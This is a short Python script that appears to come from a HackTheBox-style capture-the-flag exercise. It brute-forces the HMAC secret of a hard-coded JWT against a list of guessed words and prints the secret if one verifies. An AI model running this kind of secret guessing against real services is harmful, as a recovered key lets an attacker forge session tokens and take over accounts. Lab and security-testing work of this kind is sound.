import jwt
import sys

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImMwODUyZmZmLWM5YTktNGI1Yy1hNDkwLTc3ZDUzZjQ2ZmVjZCIsImVtYWlsIjoiaGFja2VyX2I5YzYyNTdhLTk4MGMtNGU3Yy1iMGZmLTdjZDA1YzI3NDMxM0B0ZXN0LmNvbSIsImlhdCI6MTc2MzgyNDg3NCwiZXhwIjoxNzYzODI1Nzc0fQ.k1AXmNgQjClkweDKUNGrMPvfQxS5mhGYeYvBEqiXuTc"

candidates = [
    "SecureNote", "Secure Note", "secure note", "securenote",
    "CelestialScribe", "Celestial Scribe", "celestial scribe",
    "Celestial", "Scribe", "celestial", "scribe",
    "hackthebox", "HTB", "htb",
    "admin", "secret", "password"
]

for s in candidates:
    try:
        jwt.decode(token, s, algorithms=["HS256"])
        print(f"FOUND SECRET: {s}")
        sys.exit(0)
    except:
        pass
print("Failed.")
